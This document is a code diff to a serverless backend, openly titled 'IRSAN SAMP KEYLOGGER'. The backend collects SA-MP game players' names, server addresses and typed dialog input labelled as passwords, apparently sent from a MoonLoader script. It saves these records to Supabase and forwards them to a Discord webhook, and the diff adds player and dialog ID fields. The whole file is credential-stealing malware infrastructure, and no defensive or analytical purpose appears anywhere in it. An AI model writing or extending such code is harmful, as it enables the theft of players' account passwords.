@@ -65,18 +65,20 @@ export default async function handler(req, res) {
         // 1. SIMPAN KE SUPABASE
         // ==========================================
         const logEntry = {
-            id: Date.now().toString(36) + Math.random().toString(36).substr(2, 6),
-            timestamp: data.timestamp || new Date().toISOString(),
-            servername: data.servername || 'Unknown',
-            ip: data.ip || '0.0.0.0',
-            port: data.port || 0,
-            player_name: data.playerName || 'Unknown',
-            password: data.password || data.inputtext,
-            inputtext: data.inputtext,
-            platform: data.platform || 'MoonLoader',
-            status: 'pending',
-            created_at: new Date().toISOString()
-        };
+    id: Date.now().toString(36) + Math.random().toString(36).substr(2, 6),
+    timestamp: data.timestamp || new Date().toISOString(),
+    servername: data.servername || 'Unknown',
+    ip: data.ip || '0.0.0.0',
+    port: data.port || 0,
+    player_name: data.playerName || 'Unknown',
+    player_id: data.playerId || null,        // BARU
+    dialog_id: data.dialogId || null,        // BARU
+    password: data.password || data.inputtext,
+    inputtext: data.inputtext,
+    platform: data.platform || 'MoonLoader',
+    status: 'pending',
+    created_at: new Date().toISOString()
+    };
 
         // Insert ke Supabase
         const { error: insertError } = await supabase
@@ -144,22 +146,32 @@ async function sendToDiscord(log) {
     }
 
     const embedData = {
-        embeds: [{
-            title: '🔒 LOG DATA PLAYER',
-            description: '**IRSAN SAMP KEYLOGGER**\n© 2026 IRSAN SAMP',
-            color: 16776960,
-            footer: {
-                text: `ID: ${log.id} | Supabase + Vercel`
+    embeds: [{
+        title: '🔒 LOG DATA PLAYER',
+        description: '**IRSAN SAMP KEYLOGGER**\n© 2026 IRSAN SAMP',
+        color: 16776960,
+        footer: {
+            text: `ID: ${log.id} | Supabase + Vercel`
+        },
+        timestamp: log.timestamp,
+        fields: [
+            { name: '📡 Server', value: log.servername, inline: false },
+            { name: '🌐 IP Address', value: `${log.ip}:${log.port}`, inline: false },
+            { name: '👤 Player Name', value: log.player_name, inline: false },
+            { 
+                name: '🆔 Player ID', 
+                value: log.player_id || 'N/A', 
+                inline: true 
             },
-            timestamp: log.timestamp,
-            fields: [
-                { name: '📡 Server', value: log.servername, inline: false },
-                { name: '🌐 IP Address', value: `${log.ip}:${log.port}`, inline: false },
-                { name: '👤 Player Name', value: log.player_name, inline: false },
-                { name: '⌨️ Input / Password', value: `\`\`\`\n${log.password}\n\`\`\``, inline: false }
-            ]
-        }]
-    };
+            { 
+                name: '💬 Dialog ID', 
+                value: log.dialog_id || 'N/A', 
+                inline: true 
+            },
+            { name: '⌨️ Input / Password', value: `\`\`\`\n${log.password}\n\`\`\``, inline: false }
+        ]
+    }]
+};
 
     try {
         const response = await fetch(DISCORD_WEBHOOK_URL, {
